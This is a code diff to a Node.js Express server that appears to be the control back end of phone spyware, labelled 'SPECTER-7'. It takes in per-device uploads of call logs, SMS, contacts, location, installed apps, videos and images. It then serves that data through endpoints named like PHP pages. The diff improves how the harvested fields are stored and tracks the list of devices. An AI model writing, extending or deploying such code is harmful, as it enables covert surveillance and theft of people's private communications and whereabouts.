@@ -7,12 +7,10 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Middleware
 app.use(cors());
 app.use(bodyParser.json({ limit: '200mb' }));
 app.use(express.static('public'));
 
-// إنشاء مجلد البيانات
 const dataDir = path.join(__dirname, 'data');
 if (!fs.existsSync(dataDir)) {
     fs.mkdirSync(dataDir, { recursive: true });
@@ -28,7 +26,7 @@ app.post('/upload.php', (req, res) => {
     try {
         const data = req.body;
         
-        // ✅ حفظ الصور المنفصلة
+        // حفظ الصور المنفصلة
         if (data.type === 'image_data' && data.file_data) {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -42,7 +40,6 @@ app.post('/upload.php', (req, res) => {
                 imagesData = JSON.parse(fs.readFileSync(imagesFile, 'utf8'));
             }
             
-            // لا تضف الصورة إذا كانت موجودة
             const exists = imagesData.find(img => img.name === data.file_name);
             if (!exists) {
                 imagesData.push({
@@ -55,6 +52,8 @@ app.post('/upload.php', (req, res) => {
             }
             
             fs.writeFileSync(imagesFile, JSON.stringify(imagesData, null, 2));
+            
+            updateDevicesList(deviceId);
             
             return res.json({ success: true, images_count: imagesData.length });
         }
@@ -74,8 +73,16 @@ app.post('/upload.php', (req, res) => {
             existingData = JSON.parse(fs.readFileSync(dataFilePath, 'utf8'));
         }
         
+        // استبدال البيانات بدل الدمج
         if (data.type === 'all' && data.data) {
-            existingData = { ...existingData, ...data.data };
+            if (data.data.call_logs) existingData.call_logs = data.data.call_logs;
+            if (data.data.sms) existingData.sms = data.data.sms;
+            if (data.data.contacts) existingData.contacts = data.data.contacts;
+            if (data.data.location) existingData.location = data.data.location;
+            if (data.data.device_info) existingData.device_info = data.data.device_info;
+            if (data.data.installed_apps) existingData.installed_apps = data.data.installed_apps;
+            if (data.data.videos) existingData.videos = data.data.videos;
+            existingData.timestamp = Date.now();
         } else if (data.data) {
             existingData[data.type] = data.data;
         }
@@ -165,7 +172,6 @@ app.get('/live.php', (req, res) => {
             response.apps_count = (allData.installed_apps || []).length;
         }
         
-        // ✅ عدد الصور
         const imagesFile = path.join(dataDir, deviceId, 'images_data.json');
         if (fs.existsSync(imagesFile)) {
             const images = JSON.parse(fs.readFileSync(imagesFile, 'utf8'));
@@ -185,11 +191,8 @@ app.get('/api.php', (req, res) => {
         const deviceId = req.query.device;
         const type = req.query.type;
         
-        // حذف جهاز
         if (action === 'delete_device') {
-            if (!deviceId) {
-                return res.json({ error: 'Device ID required' });
-            }
+            if (!deviceId) return res.json({ error: 'Device ID required' });
             
             const deviceDir = path.join(dataDir, deviceId);
             if (fs.existsSync(deviceDir)) {
@@ -203,7 +206,6 @@ app.get('/api.php', (req, res) => {
             return res.json({ success: true });
         }
         
-        // ✅ جلب الصور
         if (action === 'get_image_data') {
             const imagesFile = path.join(dataDir, deviceId, 'images_data.json');
             if (fs.existsSync(imagesFile)) {
@@ -214,7 +216,6 @@ app.get('/api.php', (req, res) => {
             return;
         }
         
-        // جلب بيانات محددة
         if (action === 'get_data') {
             const dataFile = path.join(dataDir, deviceId, 'data.json');
             if (fs.existsSync(dataFile)) {
@@ -298,7 +299,7 @@ app.get('/devices.json', (req, res) => {
     }
 });
 
-// ============ Helper Functions ============
+// ============ Helper ============
 function updateDevicesList(deviceId) {
     let devices = [];
     if (fs.existsSync(devicesFile)) {
@@ -319,7 +320,7 @@ function updateDevicesList(deviceId) {
     fs.writeFileSync(devicesFile, JSON.stringify(devices, null, 2));
 }
 
-// ============ Start Server ============
+// ============ Start ============
 app.listen(PORT, () => {
     console.log(`SPECTER-7 Server running on port ${PORT}`);
 });
